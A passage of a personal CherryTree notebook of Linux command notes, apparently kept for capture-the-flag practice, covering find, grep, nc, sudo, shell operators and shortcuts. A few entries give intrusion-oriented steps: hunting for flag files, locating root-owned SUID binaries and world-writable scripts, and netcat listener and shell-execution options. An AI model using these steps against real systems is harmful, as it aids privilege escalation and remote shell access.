if it cant determine try binwalk</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="binwalk" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591384028.48" ts_lastsave="1591384225.18" unique_id="577">
				<rich_text>walks through the hexdump of a file and tries to find the filetype.
i think it tries to find magicbytes in the hex file somewhere</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="vimdiff" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591384045.04" ts_lastsave="1591384051.43" unique_id="593">
				<rich_text>colorful diff

vimdiff file1 file2</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="find" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586883948.53" ts_lastsave="1589865108.36" unique_id="343">
				<rich_text>recursive file search (to the dirs u have access to)

find /
find .
find -D debugopts

find / -user username -type f 2&gt;&gt;/dev/null
find / 2&gt;&gt;/dev/null | grep flag
find / -name filename -type f 2&gt;/dev/null
find / 2&gt;&gt;/dev/null | grep -i &quot;flag&quot;                        #find anything that has a name flag inside
find / -user shiba1 -type f 2&gt;&gt;/dev/null | grep -v proc     #find non-process files
sudo find / 2&gt;&gt;/dev/null | grep -i &quot;xfce4-appfinder --collapsed&quot;

NOTE: 2&gt;/dev/null gets rid of permission denied messages

Arguments:
-type d         # d -&gt; directories, f -&gt; files,
-name           # filename or pattern?
-iname          # case insensitive version
-user           # owner of the file
-group          # group of the file
-perm           # 644, 600 OR -u=r OR /u=r | -444 means the file can be readable by everyone &amp; other permissions can be any | /444 means the file is readable by atleast one of the &quot;user, group, world&quot; &amp; other permissions cannot? be any.
-size -30c      # file &lt; 30 bytes, c-&gt;bytes, k-&gt;KiB, M-&gt;MiB
-amin +30       # accessed more than 30 mins ago | a-&gt;accessed, m-&gt;modified, c-&gt;changed, min-&gt;minute, time-&gt;day
-mtime -7       # modified in the last 7 days

NOTE2: * can be used as a ANY wildcard, but put them inside &quot;&quot;
NOTE3: man page has examples @ the bottom

Examples:
find / -type f -name &quot;*.xml&quot;
find /home -type f -iname user.txt
find / -type d -name &quot;*exploits*&quot;
find / -type f -user kittycat
find / -type f -size 150c
find /home -type f -size -2k -iname &quot;*.txt&quot;
find / -type f -perm 644
find / -type f -perm -o=w -name &quot;*.sh&quot;
find /usr/bin -type f -user root -perm -u=s
find / -type f -atime +10 -iname &quot;*.png&quot;
find /usr/bin -type f -mmin -120


</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="grep &lt;keyword&gt; &lt;fullpath&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569052055.09" ts_lastsave="1591199478.89" unique_id="43">
				<rich_text>Processes any text line by line and prints the line that has the given keyword string input.
By default, grep displays the matching lines.

REMINDER: you should almost always use -i

Arguments:
-i              //case insensitive search
-w              //avoids matching substrings
-A 2            //shows 2 lines after the string line
-B 3            //shows 3 lines before the string line
-C 4            //shows 4 lines before AND after the string line
-r “word” *     //recursive search in all files in the directory
-c              //counts
-o              //exact string search
-l              //file name search
-E              //REGULAR EXPRESSIONS
--color = none  //change color of the output
-n              //line number!  
-v              //ANTI GREP!
-F              //PATTERN is a set of newline-separated fixed strings 
</rich_text>
				<rich_text weight="heavy">-x</rich_text>
				<rich_text>              //Select only those matches that exactly match the whole line.

Eg:
grep -i “harry” /etc/passwd         //grep on that location
grep -A &lt;N&gt; &quot;string&quot; FILENAME
grep -r “harry&quot; *
grep -oE “picoCTF{.*}”              //if found returns only the stuff inside the brackets
grep -rF &quot;harry&quot; *                  //find harry but on its own line.
grep -roE &quot;.*\..*\..*\..*&quot;          //find any IP in the folder
grep -ri &quot;--collapsed&quot; /* 2&gt;/dev/null
grep -qxF ' &quot;/configs/projectname.conf&quot;' test || echo ' &quot;/configs/projectname.conf&quot;' &gt;&gt; test  //check for line exists, if not, append, if no file, makefile.


Note: You can search multiple files at the same time, meaning you can do </rich_text>
				<rich_text family="monospace">grep &lt;string&gt; &lt;file&gt; &lt;file2&gt;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="history" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045109.26" ts_lastsave="1569045129.42" unique_id="22">
				<rich_text>outputs last 500 commands inputted</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="htop" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046364.52" ts_lastsave="1586713767.39" unique_id="33">
				<rich_text>a more advanced version of top
no history graphs</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="id" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587480940.02" ts_lastsave="1587480944.43" unique_id="423">
				<rich_text>better whoami</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="identify" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579643370.15" ts_lastsave="1579643371.47" unique_id="159">
				<rich_text>shows metadata for image files</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ifconfig" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045861.95" ts_lastsave="1579644631.65" unique_id="25">
				<rich_text>ipconfig on windows
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="iwconfig" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045881.07" ts_lastsave="1591199624.57" unique_id="26">
				<rich_text>iwconfig - configure a wireless network interface</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="kill -9" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587504356.81" ts_lastsave="1587504357.23" unique_id="437">
				<rich_text>murder a pid</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="killall tmux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569054662.67" ts_lastsave="1591199655.87" unique_id="10">
				<rich_text>kills all processes of tmux</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="less" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044546.73" ts_lastsave="1587494871.39" unique_id="16">
				<rich_text>a simple program for outputting plain text that you can scroll down with hotkeys, say, a more advanced version of cat

mysql --help | less</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ln" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586883721.47" ts_lastsave="1591199694.32" unique_id="342">
				<rich_text>make links between files

</rich_text>
				<rich_text weight="heavy">Has 2 uses:</rich_text>
				<rich_text>
</rich_text>
				<rich_text weight="heavy">1)</rich_text>
				<rich_text>
&quot;hard linking&quot;, which completely duplicates the file, and links the duplicate to the original copy. Meaning What ever is done to the created link, is also done to the original file.
</rich_text>
				<rich_text weight="heavy">Usage:</rich_text>
				<rich_text>
ln source destination


</rich_text>
				<rich_text weight="heavy">2)</rich_text>
				<rich_text>
The next form of linking is symbolic linking(symlink). While a hard linked file contains the data in the original file, a symbolic link is just a glorified reference. Meaning that the actual symbolic link has no data in it at all, it's just a reference to another file.

The syntax for a symbolic link is the exact same, but it uses the -s flag, so to create a symbolic link, you would run ln -s &lt;file&gt; &lt;destination&gt;.

ls even shows that its a symbolic link with the arrow pointing to what the link is referencing. It is important to note the permissions on the symlink. It has full 777 perms meaning that in theory you can execute the symlink, however since it is just a reference, in reality it has the same perms as the original file.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="man 1 &lt;command&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569041510.23" ts_lastsave="1591016752.43" unique_id="7">
				<rich_text>man man
lol
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="nc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892880.59" ts_lastsave="1589936553.8" unique_id="126">
				<rich_text>netcat
useful for connecting to servers with open ports to interact with.
nc is sweet, you can even serve entire files through nc and listen &amp; write them on a separate machine

listen:
nc -lvnp 9001

connect:
nc $ip 9001

Arguments:
-u              # udp
-c command      # given to /bin/sh
-e file         # execute file
-q 0            # wait X seconds after EOF on stdin. Yooo this is so useful! Yoinking a file is easier with this.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ping" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045923.14" ts_lastsave="1569045923.14" unique_id="27">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ps -ef" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586679481.42" ts_lastsave="1591199962.5" unique_id="311">
				<rich_text>ps - processes snapshot

list all processes
left id is process id
right id is parent id
you can keep grepping procids to get to bottom of every process (where it runs from etc.)




</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="sha1sum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587063061.69" ts_lastsave="1591199997.69" unique_id="362">
				<rich_text>sha1sum filename        # outputs sha1hash</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="shutdown &lt;arg&gt; &lt;time&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047213.66" ts_lastsave="1591200057.21" unique_id="41">
				<rich_text>Arguments:
-h HALT
-r RESTART         # or just sudo REBOOT
-c CANCEL
&lt;time&gt; =           # in minutes, you can use “now”

Usage:
shutdown -r now
shutdown -c
shutdown -h 1</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="strings &lt;file&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579249684.65" ts_lastsave="1591200117.91" unique_id="153">
				<rich_text>Basically prints the strings of printable characters in files.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="su &lt;user&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055422.88" ts_lastsave="1591200266.87" unique_id="45">
				<rich_text>Log in as another account or group in the terminal

</rich_text>
				<rich_text weight="heavy">Usage:</rich_text>
				<rich_text>
su thmyris
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="sudo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045137.58" ts_lastsave="1591200287.24" unique_id="23">
				<rich_text>lmao

</rich_text>
				<rich_text weight="heavy">Arguments:</rich_text>
				<rich_text>
-s         //become sudo on a timer
-i         //become perma sudo
-l         //print current sudo privelages
-U &lt;user&gt;  //run as user
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="tail" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248390.83" ts_lastsave="1586268158.88" unique_id="144">
				<rich_text>Its like cat, its tail haha yes

Usage:
tail -n 10   //to only display the last 10 rows of an output.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="tee" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587053326.33" ts_lastsave="1591200353.89" unique_id="357">
				<rich_text>tee command reads the standard input and writes it to both the standard output and one or more files
NOTE: does show stdout on console


Arguments:
-a      #append


</rich_text>
				<rich_text weight="heavy">Usage:</rich_text>
				<rich_text>
</rich_text>
				<rich_text weight="heavy">1) Write stdout to a file</rich_text>
				<rich_text>
ls -la | tee ls.log
</rich_text>
				<rich_text weight="heavy">2) Multi line append:</rich_text>
				<rich_text>
sudo tee -a test2.txt &gt; /dev/null &lt;&lt;EOT
line 1
line 2
EOT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="top" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046185.08" ts_lastsave="1569046216.02" unique_id="31">
				<rich_text>task manager in terminal
 </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="touch" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569043949.29" ts_lastsave="1591200391.07" unique_id="13">
				<rich_text>1. creates a file, you can give extensions like .txt
2. touch also changes the last modified time on a file
3. touch also can create flag files idfk what it does

</rich_text>
				<rich_text underline="single">Usage:</rich_text>
				<rich_text>
touch *.txt     //all text files are now modified with nothing.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="unzip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578934003.09" ts_lastsave="1578934005.5" unique_id="141">
				<rich_text>part of zip-tools?</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="usermod" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586887153.8" ts_lastsave="1591200435.75" unique_id="348">
				<rich_text>You may be wondering how to add user to a group. that is done with the usermod command, the syntax for that is </rich_text>
				<rich_text family="monospace">usermod -a -G &lt;groups seperated by commas&gt; &lt;user&gt;</rich_text>
				<rich_text>. Meaning if I wanted to add the user noot to b I would run </rich_text>
				<rich_text family="monospace">usermod -a -G b noot</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="wget &quot;LINK&quot;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570860889.77" ts_lastsave="1591200462.57" unique_id="100">
				<rich_text>downloads the file link provides
SMALL NOTE: wget doesn't modify the modified date of the file downloaded, while the browsers do.
BIG NOTE: make sure ur downloading RAW, otherwise ur gonna download HTML xD</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="which &lt;package&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044889.69" ts_lastsave="1586377900.19" unique_id="21">
				<rich_text>outputs the path of the installed package</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="whoami" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885116.7" ts_lastsave="1587233784.31" unique_id="305">
				<rich_text>print the logged in user of the shell</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xev" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586616030.92" ts_lastsave="1586616031.85" unique_id="293">
				<rich_text>test devices!</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xxd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579642405.42" ts_lastsave="1579642611.32" unique_id="158">
				<rich_text> 
prints a hexdump or does the reverse
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="export" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589391389.07" ts_lastsave="1591200544.99" unique_id="427">
				<rich_text>

</rich_text>
				<rich_text underline="single" weight="heavy">Usage:</rich_text>
				<rich_text>
</rich_text>
				<rich_text weight="heavy">1)</rich_text>
				<rich_text>
export $IP = 192.168.0.1
$IP         # outputs set variable
</rich_text>
				<rich_text weight="heavy">2)</rich_text>
				<rich_text>
The following command adds a path to your current path for the current session:
export PATH=&quot;$PATH:/my/custom/path&quot;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="systemctl" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589393430.39" ts_lastsave="1591200556.07" unique_id="476">
				<rich_text>Control the systemd system and service manager

Usage:
systemctl status lightdm
systemctl restart apparmor
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="bash -c" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589421595.9" ts_lastsave="1591200575.24" unique_id="483">
				<rich_text>       -c        If the -c option is present, then commands are read from the first non-option argument command_string.  If
                 there are arguments after the command_string, the first argument is assigned to $0 and any remaining argu‐
                 ments  are  assigned to the positional parameters.  The assignment to $0 sets the name of the shell, which
                 is used in warning and error messages.
                 
i dont quite understand the usage but
Usage:
1) append to file
sudo bash -c 'echo &quot;/dev/sda4 /media/WIN ntfs nls-utf8,umask=000,uid=1000,gid=1000,allow_other,rw 0 0&quot;  &gt;&gt; /etc/fstab'
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="apropos" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589586407.68" ts_lastsave="1589586534.05" unique_id="477">
				<rich_text>allows you to remember forgotten linux commands

Usage:
apropos 7zip        #outputs: pz7ip</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ip a" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589873653.02" ts_lastsave="1591200634.02" unique_id="557">
				<rich_text>
like ifconfig</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="sleep" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589935909.51" ts_lastsave="1591200646.45" unique_id="567">
				<rich_text>makes terminal take a nap

sleep 1     # 1 sec
sleep 0.1   # 0.1 sec</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="git" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589938594.7" ts_lastsave="1589938599.41" unique_id="569">
				<rich_text>I NEED TO GET git in here!
its so painful with millions of .txt .pdf .jpg files as notes!
TODO</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="groups" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590102849.07" ts_lastsave="1591201147.62" unique_id="576">
				<rich_text>list groups</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="BURDA KALDIM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591201147.88" ts_lastsave="1591201147.88" unique_id="436">
					<rich_text></rich_text>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Config" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570714084.11" ts_lastsave="1570893564.84" unique_id="59">
			<rich_text>if I ever create a .bashrc or .bash_aliases file I should use gist.github for cloud storage of those settings.</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="aliases" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892688.12" ts_lastsave="1586347459.99" unique_id="123">
				<rich_text>The second method lets you make a separate aliases file, so you won't have to put them in </rich_text>
				<rich_text family="monospace">.bashrc</rich_text>
				<rich_text>, but to a file of your choice. First, edit your </rich_text>
				<rich_text family="monospace">~/.bashrc</rich_text>
				<rich_text> file and add the following lines if they don't already exist, or uncomment them if they do:
</rich_text>
				<rich_text family="monospace" foreground="#101094">if</rich_text>
				<rich_text family="monospace" foreground="#303336"> [ -f ~/.bash_aliases ]; </rich_text>
				<rich_text family="monospace" foreground="#101094">then</rich_text>
				<rich_text family="monospace" foreground="#303336">
. ~/.bash_aliases
</rich_text>
				<rich_text family="monospace" foreground="#101094">fi</rich_text>
				<rich_text>

Save it and close the file. After that, all you have to do is create a </rich_text>
				<rich_text family="monospace">~/.bash_aliases</rich_text>
				<rich_text> file and add your aliases there, with the same format specified in the first method.
Contents of my </rich_text>
				<rich_text family="monospace">~/.bash_aliases</rich_text>
				<rich_text> file:
</rich_text>
				<rich_text family="monospace" foreground="#303336">alias cs=</rich_text>
				<rich_text family="monospace" foreground="#7d2727">'cd;ls'</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="source ~/.bashrc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570893469.58" ts_lastsave="1586347513.02" unique_id="127">
				<rich_text>. ~/.bashrc         //runs .bashrc in current terminal
re-configures terminal with the new .bashrc settings without having to restart</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Operators" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862573.78" ts_lastsave="1586876372.8" unique_id="110">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="$" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586877082.35" ts_lastsave="1589391371.59" unique_id="336">
				<rich_text>it is used to denote environment variables.
$USER
$TERM
$varname</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="&amp;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586876765.31" ts_lastsave="1589390915.17" unique_id="335">
				<rich_text>./FILE &amp;

This trailing ampersand directs the shell to run the command in the background, that is, it is forked and run in a separate sub-shell, as a job, asynchronously.
The shell will print out the forked process’s job number and process ID (PID)
After a process is forked using a single trailing ampersand &amp;, its process ID (PID) is stored in a special variable $!. This can be used later to refer to the process:
Once a process is forked, it can be seen in the jobs list:
And it can be brought back to the command line before it finishes with the foreground command:
fg</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="|" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862580.51" ts_lastsave="1589391329.26" unique_id="111">
				<rich_text>pipe boi

take the output of a command and use it as input for a second command.

IMPROTANT TNOTE: It is worth noting that not all commands support the pipe, and some that do support it require you to use - instead of input, for example </rich_text>
				<rich_text family="monospace">cat -</rich_text>
				<rich_text>. So always check to see if the command does support it  </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="&amp;&amp;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586876514.85" ts_lastsave="1589168803.16" unique_id="334">
				<rich_text>execute the command to the right of this operator after the left command is finished(returned 0).</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="||" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589168812.79" ts_lastsave="1589168991.06" unique_id="331">
				<rich_text>execute the command to the right of this operator after the left command has failed(returned non-0).

grep -qxF 'include &quot;/configs/projectname.conf&quot;' test || echo 'include &quot;/configs/projectname.conf&quot;' &gt;&gt; test</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name=";" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586877641.4" ts_lastsave="1586877729.48" unique_id="338">
				<rich_text>similiar to &amp;&amp; 
if the 1st command crashes ';' executes 2nd command anyway</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="&lt;&lt;&lt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862588.1" ts_lastsave="1591199215.49" unique_id="112">
				<rich_text>reverse direction pipe boi

same thing as
echo “string” | base64 -d</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862595.83" ts_lastsave="1589169668.69" unique_id="113">
				<rich_text>Redirect the output of the command on the left to the file on the right.
WARNING: This overwrites the file completely
NOTE: doesnt show stdout on console</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="&gt;&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586876490.85" ts_lastsave="1591199242.41" unique_id="333">
				<rich_text>appends on a newline
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Shortcuts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045935.05" ts_lastsave="1589146748.38" unique_id="28">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + A" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570810449.12" ts_lastsave="1570810474.67" unique_id="99">
				<rich_text>go to the beginning of the line</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + E" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570810432.69" ts_lastsave="1570810465.47" unique_id="98">
				<rich_text>go to end of the line</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + L" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046423.66" ts_lastsave="1569046424.92" unique_id="34">
				<rich_text>clear</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + R" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046564.97" ts_lastsave="1579353446.49" unique_id="35">
				<rich_text>fuzzy reverse command search
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Alt + D" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589146748.62" ts_lastsave="1589156246.83" unique_id="472">
				<rich_text>delete everything to the right of the cursor</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569051936.36" ts_lastsave="1591017089.07" unique_id="42">
			<rich_text>(for bash)</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="#" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892706.82" ts_lastsave="1570892707.72" unique_id="124">
				<rich_text>comments out the line</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="$ on terminal" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587057562.93" ts_lastsave="1587057563.89" unique_id="358">
				<rich_text>since it is an operator, if $ is used within a hash, keep it in quotes to avoid nonsensical stuff</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="$TERM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633939.37" ts_lastsave="1586633941.7" unique_id="296">
				<rich_text>i think this is the terminal engine
it can be changed to something else

example:
tmux-256color
xterm-256color</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="hex to ascii" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579353470.3" ts_lastsave="1579353489.78" unique_id="156">
				<rich_text>echo “HEX” | xxd -r
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="reverse search tags" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892730.35" ts_lastsave="1579353470.27" unique_id="125">
				<rich_text>If you feel the command will be used frequently, you could add a tag
command #useful
Then
</rich_text>
				<rich_text family="monospace">ctrl+r #useful</rich_text>
				<rich_text> //(reverse search)
This works because </rich_text>
				<rich_text family="monospace">#</rich_text>
				<rich_text> is a comment delimiter, i.e. everything that comes after the symbol is not interpreted as a command. However, it will be recorded in the history and is thus searchable.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="bash: fdisk: command not found" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589392552.86" ts_lastsave="1589392556.81" unique_id="428">
				<rich_text>paket yuklu ama komut bulunamazsa PATH e eklenmemistir. 
dosyasi '/sbin/fstab' yazilarak calistirilabilir
pro tip: root user olursaniz (sudo -i) calisiyorlar -_-</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="py in bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589415541.55" ts_lastsave="1589421790.24" unique_id="481">
				<rich_text>This is how you can run multiple lines of python script in a bash script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

MYSTRING=&quot;Do something in bash&quot;
echo $MYSTRING

python - &lt;&lt; EOF
myPyString = &quot;Do something on python&quot;
print myPyString
a=1
b=3
if a+b == 3:
    print(&quot;wololo&quot;)

EOF

echo &quot;Back to bash&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
NOT: It does have the (major)  limitation that you can't use standard input in the python script,  though (since it's receiving stdin from the heredoc).
NOT2: input() hata verdiriyor. NOT'un aciklamasi bunu anlatiyor galiba.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2.yol: bashten degisken almali versiyon
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash
echo &quot;Executing a bash statement&quot;
export bashvar=100

cat &lt;&lt; EOF &gt; pyscript.py
#!/usr/bin/python
import subprocess
print 'Hello python'
subprocess.call([&quot;echo&quot;,&quot;$bashvar&quot;])
EOF

chmod 755 pyscript.py

./pyscript.py</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="#!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589421009.6" ts_lastsave="1589428422.91" unique_id="482">
				<rich_text>#!/bin/bash
#!/usr/bin/python3
#!/bin/perl5
yazisi kernelin execve(2) cagirirken dosyayi neyle calistiracagini anlamasi icin var.
siradan bir yorum degil.
Cogu sistemde default bash oldugundan veya dosyalar terminal icinden calistirildigindan sorun olmuyor.
Ilk satira yazilir.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="$" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589601384.09" ts_lastsave="1589601426.25" unique_id="492">
				<rich_text>$ stored variables remember?
so if your working on a box

ip=10.10.80.213

and

use '$ip' whenever you wanna input the ip
=)</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="!!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590912533.67" ts_lastsave="1590912573.4" unique_id="256">
				<rich_text>enter last command again in place of !!

whoami
sudo !!</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="$_" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590912573.53" ts_lastsave="1590912689.39" unique_id="257">
				<rich_text>enter last argument again
same thing as alt+. but with $_

echo test1 test2 test3
echo $_
-&gt; echo test3
 </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="echo $?" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591017089.46" ts_lastsave="1591017095.19" unique_id="588">
				<rich_text>display the exit code of the last command</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="note about root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586435978.31" ts_lastsave="1589606231.34" unique_id="279">
			<rich_text>if you create a folder as the root user (not with sudo)
the folder will be owned by root and no other user will be able to write to it
just FYI</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="#000dff" is_bold="True" name="Linux Software" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046358.88" ts_lastsave="1589934050.88" unique_id="32">
		<rich_text>For desktop software check faruk -&gt; PROGRAM -&gt; PROGRAM(LINUX)
or github.com/Thmyris/linux.cfg</rich_text>
